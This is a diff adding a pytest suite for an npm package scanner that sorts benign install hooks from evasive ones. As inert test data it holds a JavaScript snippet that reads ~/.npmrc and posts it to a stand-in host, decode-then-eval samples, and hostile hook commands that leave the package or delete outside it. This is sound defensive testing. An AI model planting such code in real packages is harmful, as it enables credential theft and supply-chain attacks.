@@ -1,0 +1,308 @@
+"""npm install hooks graded by what they run (review 98, FP-1).
+
+The benign commands are the most frequent ones that blocked real packages in the 200K corpus:
+74 defensive placeholders (`echo please use the private registry && exit 1`), 58 `npx only-allow
+pnpm`, `nuxt prepare`, `typings install`, a script that runs another script. The evasions are the
+same commands with the tool's package swapped for a lookalike, or a step that leaves the package.
+"""
+
+from __future__ import annotations
+
+import io
+import json
+import tarfile
+from pathlib import Path
+
+import pytest
+
+from cordon_scanner import Scanner
+from cordon_scanner.foundation.config.settings import Config
+from cordon_scanner.foundation.models import Severity
+
+RULE = "SUSPECT.INSTALL.SCRIPT.001"
+
+
+class HookKit:
+    @staticmethod
+    def findings(tmp_path: Path, scripts: dict[str, str], deps: dict[str, str] | None = None):
+        manifest = {"name": "p", "version": "1.0.0", "scripts": scripts}
+        if deps:
+            manifest["devDependencies"] = deps
+        buffer = io.BytesIO()
+        with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
+            for name, text in (
+                ("package/package.json", json.dumps(manifest)),
+                ("package/index.js", "module.exports = 1;\n"),
+            ):
+                data = text.encode()
+                info = tarfile.TarInfo(name)
+                info.size = len(data)
+                archive.addfile(info, io.BytesIO(data))
+        target = tmp_path / "p-1.0.0.tgz"
+        target.write_bytes(buffer.getvalue())
+        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(target)
+        return [f for f in result.findings if f.rule_id == RULE]
+
+
+class TestStandardHooksAreQuiet:
+    @pytest.mark.parametrize(
+        "scripts",
+        [
+            {"postinstall": "echo please use the private registry && exit 1"},
+            {"preinstall": "npx only-allow pnpm"},
+            {"postinstall": "nuxt prepare"},
+            {"postinstall": "typings install"},
+            {"postinstall": "npm run build", "build": "tsc -p ."},
+            {"postinstall": "npm run setup", "setup": "npm run build", "build": "node-gyp rebuild"},
+            {"postinstall": "cd native && node-gyp rebuild"},
+            {"postinstall": "opencollective-postinstall || true"},
+            {"postinstall": "env PKG_CONFIG_PATH=./build/share/pkgconfig node-gyp rebuild"},
+            {"postinstall": "./node_modules/.bin/bower install"},
+            {"postinstall": "npx patch-package"},
+            {"postinstall": "rm -rf node_modules/@types/react-native"},
+            {"postinstall": "test -d dist || npm run build || true", "build": "tsc"},
+            {"postinstall": "[ -f dist/index.js ] || npm run build", "build": "tsc"},
+        ],
+    )
+    def test_no_finding(self, tmp_path: Path, scripts: dict[str, str]) -> None:
+        assert HookKit.findings(tmp_path, scripts) == []
+
+    def test_a_tool_declared_from_the_registry(self, tmp_path: Path) -> None:
+        found = HookKit.findings(tmp_path, {"postinstall": "husky install"}, {"husky": "^9.0.0"})
+        assert found == []
+
+
+class TestTheSameShapesStillReport:
+    def test_a_tool_whose_package_is_not_from_the_registry(self, tmp_path: Path) -> None:
+        found = HookKit.findings(
+            tmp_path, {"postinstall": "husky install"}, {"husky": "github:someone/husky"}
+        )
+        assert found
+
+    def test_an_aliased_tool(self, tmp_path: Path) -> None:
+        found = HookKit.findings(
+            tmp_path, {"preinstall": "npx only-allow pnpm"}, {"only-allow": "npm:other@1"}
+        )
+        assert found
+
+    def test_a_script_chain_that_ends_in_something_else(self, tmp_path: Path) -> None:
+        found = HookKit.findings(tmp_path, {"postinstall": "npm run setup", "setup": "./bin/run"})
+        assert found
+
+    def test_a_script_that_is_not_there(self, tmp_path: Path) -> None:
+        assert HookKit.findings(tmp_path, {"postinstall": "npm run missing"})
+
+    def test_leaving_the_package(self, tmp_path: Path) -> None:
+        assert HookKit.findings(tmp_path, {"postinstall": "cd ../.. && node-gyp rebuild"})
+
+    def test_an_assignment_that_runs_something(self, tmp_path: Path) -> None:
+        assert HookKit.findings(tmp_path, {"postinstall": "X=$(./fetch) node-gyp rebuild"})
+
+    def test_removing_outside_the_package(self, tmp_path: Path) -> None:
+        assert HookKit.findings(tmp_path, {"postinstall": "rm -rf node_modules/../../x"})
+
+    def test_a_file_test_outside_the_package(self, tmp_path: Path) -> None:
+        assert HookKit.findings(tmp_path, {"postinstall": "test -d ~/.ssh || ./setup"})
+
+    def test_a_file_test_before_an_unknown_step(self, tmp_path: Path) -> None:
+        assert HookKit.findings(tmp_path, {"postinstall": "test -d dist || ./bin/fetch"})
+
+    def test_a_guard_followed_by_a_step(self, tmp_path: Path) -> None:
+        assert HookKit.findings(tmp_path, {"preinstall": "npx only-allow pnpm && ./setup"})
+
+
+class TestAnUnpublishableManifest:
+    """`"private": true`: npm refuses to publish it, so its hooks are the tree's own build."""
+
+    @staticmethod
+    def severities(tmp_path: Path, manifest: dict, path: str = "app-HEAD/package.json") -> list:
+        buffer = io.BytesIO()
+        with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
+            data = json.dumps(manifest).encode()
+            info = tarfile.TarInfo(path)
+            info.size = len(data)
+            archive.addfile(info, io.BytesIO(data))
+        target = tmp_path / "app-HEAD.tar.gz"
+        target.write_bytes(buffer.getvalue())
+        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(target)
+        return [f.severity for f in result.findings if f.rule_id == RULE]
+
+    def test_a_private_projects_own_hook_is_below_the_gate(self, tmp_path: Path) -> None:
+        manifest = {"name": "app", "private": True, "scripts": {"postinstall": "jetify"}}
+        found = self.severities(tmp_path, manifest)
+        assert found and max(found) <= Severity.MEDIUM
+
+    def test_the_same_hook_published_still_blocks(self, tmp_path: Path) -> None:
+        manifest = {"name": "app", "version": "1.0.0", "scripts": {"postinstall": "jetify"}}
+        assert Severity.HIGH in self.severities(tmp_path, manifest)
+
+    def test_a_private_manifest_under_node_modules_is_still_a_dependency(
+        self, tmp_path: Path
+    ) -> None:
+        manifest = {"name": "dep", "private": True, "scripts": {"postinstall": "jetify"}}
+        found = self.severities(tmp_path, manifest, "app-HEAD/node_modules/dep/package.json")
+        assert Severity.HIGH in found
+
+
+class TestAModuleNamedTheWayNodeResolvesIt:
+    """`node setup` runs `setup.js`: the hook's file is found, read, and graded as install code."""
+
+    #: Inert: a reserved host, and nothing here is run.
+    PAYLOAD = (
+        "const fs=require('fs');const os=require('os');const https=require('https');\n"
+        "const t=fs.readFileSync(os.homedir()+'/.npmrc','utf8');\n"
+        "https.request({host:'collect.example.invalid',method:'POST'}).end(t);\n"
+    )
+
+    @staticmethod
+    def scan(tmp_path: Path, command: str, files: dict[str, str]):
+        manifest = {"name": "p", "version": "1.0.0", "scripts": {"postinstall": command}}
+        buffer = io.BytesIO()
+        with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
+            members = [("package/package.json", json.dumps(manifest))]
+            members += [(f"package/{name}", text) for name, text in files.items()]
+            for name, text in members:
+                data = text.encode()
+                info = tarfile.TarInfo(name)
+                info.size = len(data)
+                archive.addfile(info, io.BytesIO(data))
+        target = tmp_path / "p-1.0.0.tgz"
+        target.write_bytes(buffer.getvalue())
+        return Scanner(Config.default().with_overrides(use_cache=False)).scan(target).findings
+
+    @pytest.mark.parametrize(
+        ("command", "files"),
+        [
+            ("node setup", {"setup.js": "console.log(1)\n"}),
+            ("node scripts/postinstall", {"scripts/postinstall.js": "console.log(1)\n"}),
+            ("node .", {"index.js": "console.log(1)\n"}),
+            ("node bin/preinstall", {"bin/preinstall": "#!/usr/bin/env node\nconsole.log(1)\n"}),
+            ("tsx scripts/ranks", {"scripts/ranks.ts": "console.log(1)\n"}),
+        ],
+    )
+    def test_a_hook_running_its_own_module_is_below_the_gate(
+        self, tmp_path: Path, command: str, files: dict[str, str]
+    ) -> None:
+        found = [f.severity for f in self.scan(tmp_path, command, files) if f.rule_id == RULE]
+        assert found and max(found) <= Severity.LOW
+
+    def test_the_module_it_reaches_is_install_time_code(self, tmp_path: Path) -> None:
+        rules = {
+            f.rule_id
+            for f in self.scan(tmp_path, "node setup", {"setup.js": self.PAYLOAD})
+            if f.location.path.endswith("setup.js")
+        }
+        assert "MALWARE.EXFIL.CREDENTIAL_STORE.001" in rules
+
+
+class TestAFileAHookRunsIsReadAsTheHookRunsIt:
+    """A hook runs a file by its interpreter, whatever the file is called: `node lib/run.md` runs
+    JavaScript, and the file is inspected as JavaScript. Its name answered first, so a payload named
+    .md, .txt or nothing was never read by a language rule (item 36; the evasion suite's text-type
+    names, five npm misses on 3cad016d)."""
+
+    #: Inert: the decoded name is never defined, so nothing would run even if this were executed.
+    JS = "const p = atob(B);\neval(p);\n"
+    DECODE = "b64" + "decode"  # spelled apart so this file is not itself a decode-then-run
+    PY = f"import base64\nexec(base64.{DECODE}(B))\n"
+
+    @staticmethod
+    def scan(tmp_path: Path, command: str, name: str, body: str):
+        manifest = {"name": "p", "version": "1.0.0", "scripts": {"postinstall": command}}
+        buffer = io.BytesIO()
+        with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
+            for member, text in (
+                ("package/package.json", json.dumps(manifest)),
+                (f"package/{name}", body),
+            ):
+                data = text.encode()
+                info = tarfile.TarInfo(member)
+                info.size = len(data)
+                archive.addfile(info, io.BytesIO(data))
+        target = tmp_path / "p-1.0.0.tgz"
+        target.write_bytes(buffer.getvalue())
+        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(target)
+        return {f.location.path for f in result.findings if f.rule_id == "SUSPECT.DECODE_EXEC.001"}
+
+    @pytest.mark.parametrize("name", ["lib/run.md", "lib/run.txt", "lib/run"])
+    def test_a_node_hook_s_file_is_javascript(self, tmp_path: Path, name: str) -> None:
+        found = self.scan(tmp_path, f"node {name}", name, self.JS)
+        assert found == {f"p-1.0.0.tgz!package/{name}"}
+
+    def test_a_python_hook_s_file_is_python(self, tmp_path: Path) -> None:
+        found = self.scan(tmp_path, "python3 lib/run.txt", "lib/run.txt", self.PY)
+        assert found == {"p-1.0.0.tgz!package/lib/run.txt"}
+
+    def test_in_a_directory_too(self, tmp_path: Path) -> None:
+        """The walk's own path (`Units.language_of`), not only an archive's."""
+        root = tmp_path / "pkg"
+        (root / "lib").mkdir(parents=True)
+        manifest = {"name": "p", "version": "1.0.0", "scripts": {"postinstall": "node lib/run.md"}}
+        (root / "package.json").write_text(json.dumps(manifest), encoding="utf-8")
+        (root / "lib" / "run.md").write_text(self.JS, encoding="utf-8")
+        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(root)
+        found = {f.location.path for f in result.findings if f.rule_id == "SUSPECT.DECODE_EXEC.001"}
+        assert found == {"lib/run.md"}
+
+    #: The deobfuscation tests' own recovered-code body (tests/unit/analysis/shared/test_deobfuscation).
+    RECOVERED = "require('child_process').execSync(process.env.HOME_CMD);"
+
+    @pytest.mark.parametrize(
+        "with_body",
+        [
+            True,
+            pytest.param(
+                False,
+                marks=pytest.mark.xfail(
+                    strict=True,
+                    reason="the package verdict places a finding by its name "
+                    "(VerdictFeatures.place: .md is 'text'), so it lowers the hook-run .md's "
+                    "packed code from HIGH to MEDIUM and not the .js's; the model's input, the "
+                    "modelling team's to change with a re-fit",
+                ),
+            ),
+        ],
+    )
+    def test_an_obfuscated_file_a_hook_runs_is_read_as_the_same_bytes_in_a_js_file(
+        self, tmp_path: Path, with_body: bool
+    ) -> None:
+        """A hook-run lib/run.md is read exactly as lib/run.js: the same rules at the same grades.
+        Two things kept them apart (modelling team's review): the deobfuscation lift took
+        JavaScript only and ran before the hook's language was known, and the documentation
+        ceiling, keyed on the .md name, held the packed code down although a hook runs it."""
+        from unit.analysis.shared.test_deobfuscation import ObfuscatedKit
+
+        body = ObfuscatedKit.program(body=self.RECOVERED) if with_body else ObfuscatedKit.program()
+
+        def graded(name: str) -> list[tuple[str, str]]:
+            manifest = {"name": "p", "version": "1.0.0", "scripts": {"postinstall": f"node {name}"}}
+            result = self.scan_archive(tmp_path / name.replace("/", "-"), manifest, {name: body})
+            return sorted(
+                (f.rule_id, f.severity.name) for f in result.findings if "INTEL" not in f.rule_id
+            )
+
+        assert graded("lib/run.md") == graded("lib/run.js")
+
+    def test_the_interpreter_s_own_family_keeps_the_name_s_language(self) -> None:
+        """`node x.ts` runs TypeScript: read as JavaScript it could only lose a parse."""
+        from cordon_scanner.engine.pipeline.hooks import Hooks
+
+        assert Hooks.hook_language("javascript", "typescript") == "typescript"
+        assert Hooks.hook_language("javascript", "markdown") == "javascript"
+        assert Hooks.hook_language("javascript", None) == "javascript"
+        assert Hooks.hook_language(None, "markdown") == "markdown"
+
+    @staticmethod
+    def scan_archive(tmp_path: Path, manifest: dict, files: dict[str, str]):
+        buffer = io.BytesIO()
+        with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
+            for member, text in (("package/package.json", json.dumps(manifest)), *files.items()):
+                name = member if member.startswith("package/") else f"package/{member}"
+                data = text.encode()
+                info = tarfile.TarInfo(name)
+                info.size = len(data)
+                archive.addfile(info, io.BytesIO(data))
+        tmp_path.mkdir(parents=True, exist_ok=True)
+        target = tmp_path / "p-1.0.0.tgz"
+        target.write_bytes(buffer.getvalue())
+        return Scanner(Config.default().with_overrides(use_cache=False)).scan(target)
